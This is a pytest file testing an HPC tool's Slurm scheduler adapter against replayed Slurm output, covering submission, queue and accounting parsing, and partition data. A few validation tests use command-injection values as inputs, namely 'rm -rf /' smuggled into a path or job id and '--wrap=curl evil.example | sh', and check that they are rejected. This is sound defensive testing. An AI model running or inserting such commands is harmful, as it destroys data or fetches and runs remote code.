"""SlurmScheduler against a scripted transport replaying real Slurm output (tests/fixtures/slurm).

Fixture files show the ASCII unit separator as the visible symbol U+241F; ``load`` turns it
back into the ``\\x1f`` byte Slurm would print.
"""

from __future__ import annotations

from collections.abc import Callable
from dataclasses import dataclass, field
from pathlib import Path

import pytest

from hpclab.adapters.base import (
    CommandFailed,
    CommandResult,
    ConnectionLost,
    RangeRead,
    SubmissionRejected,
    TransportError,
    TransportTimeout,
)
from hpclab.adapters.slurm import FS, SUBMIT_SNIPPET, SlurmScheduler
from hpclab.domain.clock import FakeClock
from hpclab.domain.errors import ErrorCode, InvalidArgument
from hpclab.domain.states import SchedulerState
from hpclab.profiles.schema import ClusterProfile, PartitionRule, ResolvedCluster, UserOverlay

FIXTURES = Path(__file__).resolve().parents[1] / "fixtures" / "slurm"
ENV = ["env", "SLURM_TIME_FORMAT=%s"]


def load(name: str) -> str:
    return (FIXTURES / name).read_text(encoding="utf-8").replace("␟", FS)


Response = CommandResult | Exception
Matcher = Callable[[list[str]], bool]


@dataclass
class FakeTransport:
    """Scripted ``Transport``: rules keyed by Slurm command; last matching rule wins."""

    cluster_id: str = "cluster1"
    user: str = "jdoe"
    calls: list[list[str]] = field(default_factory=list)
    scripts: list[tuple[str, list[str]]] = field(default_factory=list)
    files: dict[str, tuple[bytes, float]] = field(default_factory=dict)
    rules: list[tuple[str, Matcher, Callable[[list[str]], Response]]] = field(default_factory=list)

    def on(
        self,
        command: str,
        stdout: str = "",
        stderr: str = "",
        rc: int = 0,
        *,
        when: Matcher | None = None,
        raises: Exception | None = None,
    ) -> None:
        def respond(argv: list[str]) -> Response:
            return raises if raises is not None else CommandResult(argv, rc, stdout, stderr, 0.01)

        self.rules.append((command, when or (lambda _argv: True), respond))

    def _dispatch(self, command: str, argv: list[str]) -> CommandResult:
        for name, match, respond in reversed(self.rules):
            if name == command and match(argv):
                out = respond(argv)
                if isinstance(out, Exception):
                    raise out
                return out
        return CommandResult(argv, 127, "", f"env: '{command}': No such file or directory", 0.01)

    def run(self, argv: list[str], *, timeout: float = 30.0, stdin: bytes | None = None) -> CommandResult:
        self.calls.append(list(argv))
        command = argv[2] if argv[:2] == ENV else argv[0]
        return self._dispatch(command, argv)

    def run_script(
        self, script: str, *, timeout: float = 30.0, args: list[str] | None = None
    ) -> CommandResult:
        self.scripts.append((script, list(args or [])))
        return self._dispatch("run_script", list(args or []))

    def read_range(self, remote_path: str, offset: int, length: int, *, timeout: float = 30.0) -> RangeRead:
        if remote_path not in self.files:
            raise FileNotFoundError(remote_path)
        data, mtime = self.files[remote_path]
        chunk = data[offset : offset + length]
        return RangeRead(remote_path, offset, chunk, len(data), mtime, 42, offset + len(chunk) >= len(data))

    def remote_user(self) -> str:
        return self.user

    def commands(self) -> list[str]:
        return [c[2] if c[:2] == ENV else c[0] for c in self.calls]


def probe_ok(fake: FakeTransport, *, config: str | None = None, helpformat: str | None = None) -> None:
    fake.on("sbatch", load("sbatch_version.txt"), when=lambda a: "--version" in a)
    fake.on("squeue", load("squeue_help.txt"), when=lambda a: "--help" in a)
    fake.on(
        "scontrol",
        config if config is not None else load("scontrol_show_config.txt"),
        when=lambda a: "config" in a,
    )
    fake.on(
        "sacct",
        helpformat if helpformat is not None else load("sacct_helpformat.txt"),
        when=lambda a: "--helpformat" in a,
    )
    fake.on("sstat", "JobID MaxRSS", when=lambda a: "--helpformat" in a)
    fake.on("srun", "slurm 23.02.7\n", when=lambda a: "--version" in a)


@pytest.fixture
def cluster() -> ResolvedCluster:
    profile = ClusterProfile(
        cluster_id="cluster1",
        display_name="ExampleHPC cluster",
        partitions={"gpu": PartitionRule(preemptible=False, default=True)},
    )
    return ResolvedCluster(
        profile=profile, overlay=UserOverlay(cluster_id="cluster1", user="jdoe", account="mylab")
    )


@pytest.fixture
def fake() -> FakeTransport:
    t = FakeTransport()
    probe_ok(t)
    return t


@pytest.fixture
def clock() -> FakeClock:
    return FakeClock()


@pytest.fixture
def sched(fake: FakeTransport, cluster: ResolvedCluster, clock: FakeClock) -> SlurmScheduler:
    return SlurmScheduler(fake, cluster, clock=clock)


def frame(rc: int, stdout: str = "", *, journal: str = "ok", stage: str = "sbatch") -> str:
    return f"HPCLAB-SUBMIT/1 stage={stage} rc={rc} journal={journal}\n{stdout}\n"


# ---------------------------------------------------------------------------
# capabilities
# ---------------------------------------------------------------------------


def test_every_command_is_prefixed_with_epoch_time_format(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("squeue", load("squeue_jobs.txt"), when=lambda a: "--Format" in " ".join(a))
    fake.on("sinfo", load("sinfo_nodes.txt"))
    fake.on("scontrol", load("scontrol_partitions.txt"), when=lambda a: "partition" in a)
    sched.probe_capabilities()
    sched.query_queue(job_ids=["4242"])
    sched.partitions()
    assert fake.calls and all(c[:2] == ENV for c in fake.calls)


def test_probe_capabilities_parses_and_caches(fake: FakeTransport, sched: SlurmScheduler) -> None:
    caps = sched.probe_capabilities()
    assert caps.slurm_version == "23.02.7"
    assert caps.squeue_json is True
    assert caps.sacct_available and caps.sacct_comment_field and caps.sstat_available and caps.srun_overlap
    assert caps.probed_at is not None
    n = len(fake.calls)
    assert sched.probe_capabilities() is caps
    assert len(fake.calls) == n
    sched.probe_capabilities(refresh=True)
    assert len(fake.calls) == 2 * n


def test_probe_without_sbatch_is_unsupported(cluster: ResolvedCluster) -> None:
    sched = SlurmScheduler(FakeTransport(), cluster)
    with pytest.raises(CommandFailed) as exc:
        sched.probe_capabilities()
    assert exc.value.code == ErrorCode.UNSUPPORTED


def test_probe_detects_disabled_accounting_and_missing_comment_flag(cluster: ResolvedCluster) -> None:
    fake = FakeTransport()
    config = load("scontrol_show_config.txt").replace(
        "accounting_storage/slurmdbd", "accounting_storage/none"
    )
    probe_ok(fake, config=config)
    caps = SlurmScheduler(fake, cluster).probe_capabilities()
    assert caps.sacct_available is False
    assert any("disabled" in n for n in caps.notes)

    fake2 = FakeTransport()
    probe_ok(fake2, config=load("scontrol_show_config.txt").replace("job_comment,job_script", "job_script"))
    caps2 = SlurmScheduler(fake2, cluster).probe_capabilities()
    assert caps2.sacct_available and not caps2.sacct_comment_field


def test_probe_retries_after_a_transient_scontrol_failure(cluster: ResolvedCluster) -> None:
    # A controller restart during the first probe must not disable the Comment field for the
    # lifetime of a long-running controller process.
    fake = FakeTransport()
    probe_ok(fake)
    fake.on(
        "scontrol",
        "",
        "slurm_load_ctl_conf error: Unable to contact slurm controller (connect failure)",
        rc=1,
        when=lambda a: "config" in a,
    )
    clock = FakeClock()
    sched = SlurmScheduler(fake, cluster, clock=clock)
    degraded = sched.probe_capabilities()
    assert degraded.sacct_comment_field is False
    assert any("scontrol show config failed" in n for n in degraded.notes)
    assert sched.probe_capabilities() is degraded  # still cached inside the retry window

    fake.rules.pop()  # controller is back
    clock.advance(sched.partial_probe_retry_s + 1)
    healed = sched.probe_capabilities()
    assert healed is not degraded and healed.sacct_comment_field is True
    n = len(fake.calls)
    clock.advance(10 * sched.partial_probe_retry_s)
    assert sched.probe_capabilities() is healed and len(fake.calls) == n  # complete probes stick


def test_probe_old_slurm_has_no_overlap(cluster: ResolvedCluster) -> None:
    fake = FakeTransport()
    probe_ok(fake)
    fake.on("sbatch", "slurm 20.02.7\n", when=lambda a: "--version" in a)
    caps = SlurmScheduler(fake, cluster).probe_capabilities()
    assert caps.srun_overlap is False


# ---------------------------------------------------------------------------
# submit
# ---------------------------------------------------------------------------


def test_submit_success_passes_exact_argv(
    fake: FakeTransport, sched: SlurmScheduler, clock: FakeClock
) -> None:
    fake.on("run_script", frame(0, "4242"))
    resp = sched.submit("/r/att/job.sbatch", workdir="/r/att", receipt_path="/r/att/submit.receipt")
    assert (resp.job_id, resp.cluster_name, resp.raw) == ("4242", None, "4242")
    assert resp.submitted_at == "2026-09-01T12:00:00.000Z"
    script, args = fake.scripts[-1]
    assert script == SUBMIT_SNIPPET
    # No SLURM_TIME_FORMAT for a real submission: sbatch --parsable prints no times, and the
    # variable would be exported into the job (--export=ALL).
    assert args == ["/r/att/submit.receipt", "/r/att", "sbatch", "--parsable", "/r/att/job.sbatch"]


def test_submit_parses_cluster_suffix(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("run_script", frame(0, "4242;cluster1"))
    resp = sched.submit("job.sbatch", workdir="/w")
    assert (resp.job_id, resp.cluster_name) == ("4242", "cluster1")
    assert fake.scripts[-1][1][0] == ""  # no receipt requested


def test_submit_test_only_returns_empty_job_id(fake: FakeTransport, sched: SlurmScheduler) -> None:
    msg = "sbatch: Job 4244 to start at 1790000000 using 8 processors on nodes gpu-node-4 in partition gpu\n"
    fake.on("run_script", frame(0, ""), stderr=msg)
    resp = sched.submit("job.sbatch", workdir="/w", test_only=True)
    assert resp.job_id == ""
    assert resp.raw.startswith("Job 4244 to start at")
    assert fake.scripts[-1][1][2:] == [*ENV, "sbatch", "--parsable", "--test-only", "job.sbatch"]
    est = sched.test_submit("job.sbatch", workdir="/w")
    assert (est.partition, est.processors, est.nodes) == ("gpu", 8, "gpu-node-4")


def test_submit_test_only_refusal_is_rejected(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on(
        "run_script",
        frame(1),
        stderr="sbatch: error: Batch job submission failed: Requested node configuration is not available\n",
    )
    with pytest.raises(SubmissionRejected):
        sched.submit("job.sbatch", workdir="/w", test_only=True)
    fake.on(
        "run_script",
        frame(1),
        stderr="sbatch: error: Batch job submission failed: Socket timed out on send/recv operation\n",
    )
    with pytest.raises(TransportError) as exc:
        sched.submit("job.sbatch", workdir="/w", test_only=True)
    assert not isinstance(exc.value, ConnectionLost)  # a test-only call never queues anything


@pytest.mark.parametrize("test_only", [False, True])
def test_submit_client_side_option_error_is_a_definite_refusal(
    fake: FakeTransport, sched: SlurmScheduler, test_only: bool
) -> None:
    # `#SBATCH --signal=B:USR1@70000` (lead_s above Slurm's uint16) or a typo in extra_sbatch:
    # sbatch exits while parsing options, before any RPC. That is a refusal, not an uncertain
    # submission (15-minute reconcile, then a human decision), and --test-only must report it.
    fake.on("run_script", frame(255), stderr="sbatch: error: Invalid --signal specification\n")
    with pytest.raises(SubmissionRejected) as exc:
        sched.submit("job.sbatch", workdir="/w", receipt_path="/w/submit.receipt", test_only=test_only)
    assert exc.value.details["reason_code"] == "invalid_option"
    assert exc.value.details["retry_later"] is False
    assert "Invalid --signal specification" in exc.value.message


@pytest.mark.parametrize(
    ("stderr", "reason", "retry_later"),
    [
        (
            "sbatch: error: Batch job submission failed: Invalid account or account/partition combination specified",
            "invalid_account",
            False,
        ),
        (
            "sbatch: error: invalid partition specified: gpux\n"
            "sbatch: error: Batch job submission failed: Invalid partition name specified",
            "invalid_partition",
            False,
        ),
        (
            "sbatch: error: QOSMaxSubmitJobPerUserLimit\nsbatch: error: Batch job submission failed: "
            "Job violates accounting/QOS policy (job submit limit, user's size and/or time limits)",
            "submit_limit",
            True,
        ),
        (
            "sbatch: error: Batch job submission failed: Invalid generic resource (gres) specification",
            "invalid_gres",
            False,
        ),
    ],
)
def test_submit_definite_rejections(
    fake: FakeTransport, sched: SlurmScheduler, stderr: str, reason: str, retry_later: bool
) -> None:
    fake.on("run_script", frame(1), stderr=stderr + "\n")
    with pytest.raises(SubmissionRejected) as exc:
        sched.submit("job.sbatch", workdir="/w", receipt_path="/w/submit.receipt")
    assert exc.value.details["reason_code"] == reason
    assert exc.value.details["retry_later"] is retry_later
    assert "Batch job submission failed" in exc.value.details["stderr"] or reason == "submit_limit"


@pytest.mark.parametrize(
    "stderr",
    [
        "sbatch: error: Batch job submission failed: Socket timed out on send/recv operation",
        "sbatch: error: Batch job submission failed: Unable to contact slurm controller (connect failure)",
        "sbatch: error: Batch job submission failed: Zero Bytes were transmitted or received",
        "",
        "something nobody has seen before",
    ],
)
def test_submit_ambiguous_failures_are_uncertain(
    fake: FakeTransport, sched: SlurmScheduler, stderr: str
) -> None:
    fake.on("run_script", frame(1), stderr=stderr)
    with pytest.raises(ConnectionLost) as exc:
        sched.submit("job.sbatch", workdir="/w")
    assert exc.value.maybe_executed is True


def test_submit_without_frame_or_id_is_uncertain(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("run_script", "", rc=255)
    with pytest.raises(ConnectionLost) as exc:
        sched.submit("job.sbatch", workdir="/w")
    assert exc.value.details["reason_code"] == "no_reply_frame"
    fake.on("run_script", frame(0, "garbled output"))
    with pytest.raises(ConnectionLost) as exc2:
        sched.submit("job.sbatch", workdir="/w")
    assert exc2.value.details["reason_code"] == "unparsable_reply"


def test_submit_frame_survives_login_shell_output_without_newline(
    fake: FakeTransport, sched: SlurmScheduler
) -> None:
    # e.g. a ~/.bashrc that sets the terminal title with printf and no trailing newline.
    fake.on("run_script", "\x1b]0;login01\x07" + frame(0, "4242"))
    assert sched.submit("/w/job.sbatch", workdir="/w").job_id == "4242"


def test_submit_bad_workdir_is_a_definite_rejection(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("run_script", frame(1, stage="chdir", journal="skipped"))
    with pytest.raises(SubmissionRejected) as exc:
        sched.submit("job.sbatch", workdir="/missing")
    assert exc.value.details["reason_code"] == "workdir_unavailable"


def test_submit_transport_errors_propagate_unchanged(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("run_script", raises=TransportTimeout("ssh timed out"))
    with pytest.raises(TransportTimeout):
        sched.submit("job.sbatch", workdir="/w")


def test_submit_rejects_newlines_in_paths(sched: SlurmScheduler) -> None:
    with pytest.raises(InvalidArgument):
        sched.submit("job.sbatch\nrm -rf /", workdir="/w")


def test_submit_refuses_a_script_path_sbatch_would_parse_as_an_option(
    fake: FakeTransport, sched: SlurmScheduler
) -> None:
    with pytest.raises(InvalidArgument):
        sched.submit("--wrap=curl evil.example | sh", workdir="/w")
    assert not fake.scripts  # nothing reached the cluster


@pytest.mark.parametrize("receipt", ["~/hpclab/att/submit.receipt", "$USER/submit.receipt", "rel/receipt"])
def test_submit_requires_an_absolute_receipt_path(
    fake: FakeTransport, sched: SlurmScheduler, receipt: str
) -> None:
    # The snippet quotes the path: "~" or "$USER" would never expand, and the journal that makes
    # a lost reply recoverable would be written where read_receipt never looks.
    with pytest.raises(InvalidArgument):
        sched.submit("/w/job.sbatch", workdir="/w", receipt_path=receipt)
    assert not fake.scripts


def test_submit_missing_sbatch_is_rejected_not_uncertain(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("run_script", frame(127), stderr="env: 'sbatch': No such file or directory\n")
    with pytest.raises(SubmissionRejected) as exc:
        sched.submit("job.sbatch", workdir="/w")
    assert exc.value.details["reason_code"] == "sbatch_unavailable"


# ---------------------------------------------------------------------------
# receipts
# ---------------------------------------------------------------------------


def test_read_receipt_variants(fake: FakeTransport, sched: SlurmScheduler) -> None:
    assert sched.read_receipt("/w/missing") is None
    fake.files["/w/ok"] = (b"0\n4242\n", 1790000000.0)
    resp = sched.read_receipt("/w/ok")
    assert resp is not None and resp.job_id == "4242" and resp.submitted_at == "2026-09-21T14:13:20.000Z"
    fake.files["/w/rej"] = (
        b"1\n\nsbatch: error: Batch job submission failed: Invalid qos specification\n",
        1790000000.0,
    )
    with pytest.raises(SubmissionRejected) as exc:
        sched.read_receipt("/w/rej")
    assert exc.value.details["reason_code"] == "invalid_qos"
    fake.files["/w/amb"] = (b"1\n\nsbatch: error: Batch job submission failed: Socket timed out\n", 1.0)
    assert sched.read_receipt("/w/amb") is None
    fake.files["/w/bad"] = (b"not a receipt", 1.0)
    assert sched.read_receipt("/w/bad") is None
    record = sched.read_receipt_record("/w/amb")
    assert record is not None and record.failure is not None and record.failure.kind == "ambiguous"


# ---------------------------------------------------------------------------
# squeue
# ---------------------------------------------------------------------------


def test_query_queue_parses_real_rows(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("squeue", load("squeue_jobs.txt"), when=lambda a: any(x.startswith("--Format") for x in a))
    result = sched.query_queue(job_ids=["4242", "4243", "4300", "4250", "4251"])
    assert result.complete and result.source == "squeue"
    by_id = {j.job_id: j for j in result.jobs}
    run = by_id["4242"]
    assert run.state == SchedulerState.RUNNING and run.raw_state == "RUNNING"
    assert (run.name, run.comment, run.user, run.account, run.partition) == (
        "hl.mixup-seed1.abcd2345",
        "hpclab:abcd2345efgh",
        "jdoe",
        "mylab",
        "gpu",
    )
    assert run.submit_time == "2026-09-21T14:13:20.000Z"
    assert run.start_time is not None and run.end_time is None  # EndTime of a running job is an estimate
    assert (run.elapsed_s, run.time_limit_s, run.alloc_gpus, run.reason, run.restart_count) == (
        5025,
        21600,
        1,
        None,
        0,
    )
    pend = by_id["4243"]
    assert pend.state == SchedulerState.PENDING and pend.reason == "Resources"
    assert pend.start_time is None and pend.node_list is None and pend.comment is None
    assert pend.name == "train big | model" and pend.alloc_gpus == 4
    arr = by_id["4300_4"]
    assert (arr.array_task_id, arr.alloc_gpus, arr.restart_count, arr.node_list) == (
        "4",
        4,
        2,
        "gpu-node-[6,9]",
    )
    assert by_id["4300_[5-9]"].array_task_id == "[5-9]"
    done = by_id["4250"]
    assert done.state == SchedulerState.COMPLETED and done.end_time is not None and done.alloc_gpus == 0
    cancelled = by_id["4251"]
    assert cancelled.state == SchedulerState.CANCELLED and cancelled.start_time is None


def test_query_queue_argv(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("squeue", "")
    sched.query_queue(job_ids=["1", "2_3"])
    argv = fake.calls[-1]
    assert argv[:7] == [*ENV, "squeue", "--noheader", "--array", "--states=all", "--jobs=1,2_3"]
    fmt = argv[7]
    assert fmt.startswith("--Format=JobArrayID:0\x1f,State:0\x1f") and fmt.endswith(",Reason:0")


def test_query_queue_unknown_ids_are_not_an_error(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("squeue", "", "slurm_load_jobs error: Invalid job id specified\n", rc=1)
    result = sched.query_queue(job_ids=["999999"])
    assert result.complete and result.jobs == []


def test_query_queue_chunks_and_reports_partial_failure(fake: FakeTransport, sched: SlurmScheduler) -> None:
    ids = [str(1000 + i) for i in range(250)]
    fake.on("squeue", load("squeue_jobs.txt").splitlines()[0] + "\n")
    fake.on(
        "squeue",
        "",
        "slurm_load_jobs error: Socket timed out on send/recv operation\n",
        rc=1,
        when=lambda a: any(x.startswith("--jobs=1100,") for x in a),
    )
    result = sched.query_queue(job_ids=ids)
    squeue_calls = [c for c in fake.calls if c[2] == "squeue" and "--help" not in c]
    assert len(squeue_calls) == 3
    assert all(len(c[6].removeprefix("--jobs=").split(",")) <= 100 for c in squeue_calls)
    assert result.complete is False and "Socket timed out" in (result.error or "")
    assert len(result.jobs) == 2  # two healthy chunks observed


def test_query_queue_total_failure_raises(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on(
        "squeue", "", "slurm_load_jobs error: Unable to contact slurm controller (connect failure)\n", rc=1
    )
    with pytest.raises(CommandFailed) as exc:
        sched.query_queue(job_ids=["1"])
    assert exc.value.code == ErrorCode.UNAVAILABLE


def test_query_queue_by_user_and_edge_inputs(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("squeue", "")
    assert sched.query_queue(job_ids=[]).jobs == []
    assert not fake.calls
    sched.query_queue()
    assert "--user=jdoe" in fake.calls[-1]
    with pytest.raises(InvalidArgument):
        sched.query_queue(job_ids=["12; rm -rf /"])
    with pytest.raises(InvalidArgument):
        sched.query_queue(user="bad user")


# ---------------------------------------------------------------------------
# sacct
# ---------------------------------------------------------------------------


def test_query_accounting_parses_real_rows(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("sacct", load("sacct_jobs.txt"), when=lambda a: "--allocations" in a)
    result = sched.query_accounting(job_ids=["4242", "4243"])
    argv = fake.calls[-1]
    assert (
        "--parsable2" in argv
        and f"--delimiter={FS}" in argv
        and not any(a.startswith("--starttime") for a in argv)
    )
    fmt = next(a for a in argv if a.startswith("--format="))
    assert fmt.endswith(",WorkDir,JobName,Comment,SubmitLine")
    by_id = {j.job_id: j for j in result.jobs}
    ok = by_id["4242"]
    assert (ok.state, ok.exit_code, ok.exit_signal, ok.elapsed_s, ok.time_limit_s, ok.alloc_gpus) == (
        SchedulerState.COMPLETED,
        0,
        0,
        3600,
        21600,
        1,
    )
    assert ok.comment == "hpclab:abcd2345efgh" and ok.submit_line.startswith("sbatch --parsable")
    assert by_id["4243"].state == SchedulerState.FAILED and by_id["4243"].exit_code == 1
    cancelled = by_id["4244"]
    assert cancelled.state == SchedulerState.CANCELLED and cancelled.raw_state == "CANCELLED by 12345"
    assert by_id["4245"].state == SchedulerState.TIMEOUT and by_id["4245"].time_limit_s == 3600
    oom = by_id["4246"]
    assert oom.state == SchedulerState.OUT_OF_MEMORY and oom.exit_signal == 125
    assert by_id["4247"].state == SchedulerState.NODE_FAIL
    pend = by_id["4248"]
    assert (
        pend.start_time is None
        and pend.end_time is None
        and pend.node_list is None
        and pend.alloc_gpus is None
    )
    assert pend.submit_line == 'sbatch --wrap "python a.py | tee log.txt"'
    running = by_id["4249"]
    assert running.end_time is None and running.time_limit_s is None and running.alloc_gpus == 2
    assert by_id["4300_3"].array_task_id == "3"
    assert by_id["4251"].exit_signal == 11


def test_query_accounting_window_and_filters(
    fake: FakeTransport, sched: SlurmScheduler, clock: FakeClock
) -> None:
    fake.on("sacct", "", when=lambda a: "--allocations" in a)
    sched.query_accounting(name="hl.x.abcd2345")
    argv = fake.calls[-1]
    assert "--user=jdoe" in argv and "--name=hl.x.abcd2345" in argv
    assert "--starttime=now-604800" in argv  # default 7 days
    sched.query_accounting(user="alice", since="2026-09-01T11:00:00Z")
    assert "--starttime=now-3600" in fake.calls[-1]
    sched.query_accounting(job_ids=["5"], since="2026-09-01T11:59:30.5Z")
    assert "--starttime=now-30" in fake.calls[-1]
    with pytest.raises(InvalidArgument):
        sched.query_accounting(since="yesterday")


def test_query_accounting_old_sacct_omits_unknown_fields(cluster: ResolvedCluster) -> None:
    fake = FakeTransport()
    probe_ok(fake, helpformat=load("sacct_helpformat_2002.txt"))
    fake.on("sacct", "", when=lambda a: "--allocations" in a)
    SlurmScheduler(fake, cluster).query_accounting(job_ids=["1"])
    fmt = next(a for a in fake.calls[-1] if a.startswith("--format="))
    assert "SubmitLine" not in fmt and "WorkDir" not in fmt and fmt.endswith("JobName,Comment")


@pytest.mark.parametrize(
    ("stderr", "rc", "code"),
    [
        ("sacct: error: Slurm accounting storage is disabled\n", 1, ErrorCode.UNSUPPORTED),
        ("sacct: error: Problem talking to the database: Connection refused\n", 1, ErrorCode.UNAVAILABLE),
        ("env: 'sacct': No such file or directory\n", 127, ErrorCode.UNSUPPORTED),
    ],
)
def test_query_accounting_unavailable_never_empty_success(
    fake: FakeTransport, sched: SlurmScheduler, stderr: str, rc: int, code: ErrorCode
) -> None:
    fake.on("sacct", "", stderr, rc=rc, when=lambda a: "--allocations" in a)
    with pytest.raises(TransportError) as exc:
        sched.query_accounting(job_ids=["1"])
    assert exc.value.code == code


def test_query_accounting_database_error_with_exit_zero_is_not_empty_success(
    fake: FakeTransport, sched: SlurmScheduler
) -> None:
    stderr = (
        "sacct: error: slurm_persist_conn_open_without_init: failed to open persistent connection "
        "to host:slurmdbd:6819: Connection refused\n"
        "sacct: error: Problem talking to the database: Connection refused\n"
    )
    fake.on("sacct", "", stderr, rc=0, when=lambda a: "--allocations" in a)
    with pytest.raises(TransportError) as exc:
        sched.query_accounting(job_ids=["1"])
    assert exc.value.code == ErrorCode.UNAVAILABLE
    with pytest.raises(TransportError):
        sched.usage(account="mylab", users=None, since="2026-08-01T12:00:00Z", until=None)


def test_query_accounting_when_probe_says_no_sacct(cluster: ResolvedCluster) -> None:
    fake = FakeTransport()
    probe_ok(fake)
    fake.on(
        "sacct", "", "env: 'sacct': No such file or directory", rc=127, when=lambda a: "--helpformat" in a
    )
    with pytest.raises(TransportError) as exc:
        SlurmScheduler(fake, cluster).query_accounting(job_ids=["1"])
    assert exc.value.code == ErrorCode.UNSUPPORTED


# ---------------------------------------------------------------------------
# resources
# ---------------------------------------------------------------------------


def test_partitions_aggregate_gpu_capacity(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("sinfo", load("sinfo_nodes.txt"))
    fake.on("scontrol", load("scontrol_partitions.txt"), when=lambda a: "partition" in a)
    parts = {p.name: p for p in sched.partitions()}
    gpu = parts["gpu"]
    assert gpu.default is True and gpu.state == "up" and gpu.max_time_s == 7 * 86400 and gpu.nodes_total == 6
    assert gpu.gpu_types["h100"] == {"total": 40, "used": 8, "free": 13, "unavailable": 16}
    assert gpu.gpu_types["b200"] == {"total": 8, "used": 2, "free": 0, "unavailable": 6}
    assert gpu.preemptible is False  # from the profile rule
    lo = parts["scavenge"]
    assert lo.gpu_types["h200"] == {"total": 16, "used": 1, "free": 7, "unavailable": 8}
    assert lo.preemptible is True  # PreemptMode=REQUEUE and lowest PriorityTier
    assert parts["interactive"].gpu_types == {"untyped": {"total": 8, "used": 2, "free": 6, "unavailable": 0}}
    assert parts["interactive"].preemptible is False
    assert parts["cpu"].gpu_types == {} and parts["cpu"].preemptible is False
    new = parts["gpu-new"]
    assert new.nodes_total == 0 and new.max_time_s is None and new.state == "INACTIVE"
    assert fake.calls[-1][2:] == ["scontrol", "--oneliner", "show", "partition"]


def test_partitions_preemption_unknown_under_qos_preemption(cluster: ResolvedCluster) -> None:
    # With PreemptType=preempt/qos, partition tiers say nothing about who can be preempted:
    # a top-tier partition is "unknown", never a confident False.
    fake = FakeTransport()
    probe_ok(
        fake,
        config=load("scontrol_show_config.txt").replace("preempt/partition_prio", "preempt/qos"),
    )
    fake.on("sinfo", load("sinfo_nodes.txt"))
    fake.on("scontrol", load("scontrol_partitions.txt"), when=lambda a: "partition" in a)
    parts = {p.name: p for p in SlurmScheduler(fake, cluster).partitions()}
    assert parts["interactive"].preemptible is None  # PreemptMode=CANCEL, highest tier
    assert parts["scavenge"].preemptible is True  # lower tier: flagged (the safe direction)
    assert parts["cpu"].preemptible is False  # PreemptMode=OFF
    assert parts["gpu"].preemptible is False  # the profile rule still wins


def test_partitions_tolerate_scontrol_failure(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("sinfo", load("sinfo_nodes.txt"))
    fake.on("scontrol", "", "scontrol: error: Socket timed out", rc=1, when=lambda a: "partition" in a)
    parts = {p.name: p for p in sched.partitions()}
    assert parts["gpu"].preemptible is False and parts["scavenge"].preemptible is None


def test_partitions_sinfo_failure_raises(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("sinfo", "", "sinfo: error: Unable to contact slurm controller", rc=1)
    with pytest.raises(CommandFailed):
        sched.partitions()


def test_nodes_merge_partitions_and_filter(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("sinfo", load("sinfo_nodes.txt"))
    nodes = {n.name: n for n in sched.nodes()}
    assert nodes["gpu-node-8"].partitions == ["gpu", "scavenge"]
    assert nodes["gpu-node-2"].reason == "NFS client black hole" and nodes["gpu-node-2"].state == "drained"
    assert nodes["gpu-node-1"].reason is None and nodes["cpu-01"].gres is None
    sched.nodes("scavenge")
    assert "--partition=scavenge" in fake.calls[-1]


def test_associations(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("sacctmgr", load("sacctmgr_assoc.txt"))
    assocs = sched.associations("jdoe")
    assert [(a.account, a.partition, a.qos, a.default_qos) for a in assocs] == [
        ("mylab", None, ["normal", "scavenge"], "normal"),
        ("mylab", "interactive", ["interactive"], "interactive"),
    ]
    assert fake.calls[-1][2:] == [
        "sacctmgr",
        "--noheader",
        "--parsable2",
        "show",
        "associations",
        "where",
        "user=jdoe",
        "format=Cluster,Account,User,Partition,QOS,DefaultQOS",
    ]
    fake.on("sacctmgr", "", "sacctmgr: error: Problem talking to the database: Connection refused", rc=1)
    with pytest.raises(CommandFailed) as exc:
        sched.associations("jdoe")
    assert exc.value.code == ErrorCode.UNAVAILABLE


def test_associations_of_other_clusters_in_a_shared_slurmdbd_are_ignored(
    fake: FakeTransport, sched: SlurmScheduler
) -> None:
    # One slurmdbd often serves several clusters; sacctmgr lists all of them. An account that
    # only exists on the sibling cluster must not look usable here.
    fake.on("sacctmgr", load("sacctmgr_assoc.txt") + "cluster1-dev|otherlab|jdoe||normal|normal\n")
    assert {a.account for a in sched.associations("jdoe")} == {"mylab"}


def test_start_estimates(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("squeue", load("squeue_start.txt"), when=lambda a: "--start" in a)
    est = sched.start_estimates(["4243", "4300_5"])
    assert [(e.job_id, e.start_time, e.reason) for e in est] == [
        ("4243", "2026-09-22T18:00:00.000Z", "Resources"),
        ("4300_5", None, "Priority"),
    ]
    fake.on(
        "squeue", "", "slurm_load_jobs error: Invalid job id specified", rc=1, when=lambda a: "--start" in a
    )
    assert sched.start_estimates(["1"]) == []


def test_step_stats(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("sstat", load("sstat_steps.txt"), when=lambda a: "--allsteps" in a)
    stats = {s.step: s for s in sched.step_stats("4242")}
    assert stats["batch"].max_rss_bytes == 4194304 * 1024 and stats["batch"].ave_cpu_s == 3723
    assert stats["0"].ave_cpu_s == 93784 and stats["extern"].max_rss_bytes == 0
    assert stats["batch"].tres_usage is not None and stats["batch"].job_id == "4242"
    fake.on(
        "sstat", "", "sstat: error: couldn't get steps for job 4242\n", rc=1, when=lambda a: "--allsteps" in a
    )
    assert sched.step_stats("4242") == []
    fake.on("sstat", "", "sstat: error: Socket timed out\n", rc=1, when=lambda a: "--allsteps" in a)
    with pytest.raises(CommandFailed):
        sched.step_stats("4242")


def test_gpu_samples(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("srun", load("nvidia_smi.csv"), when=lambda a: "--overlap" in a)
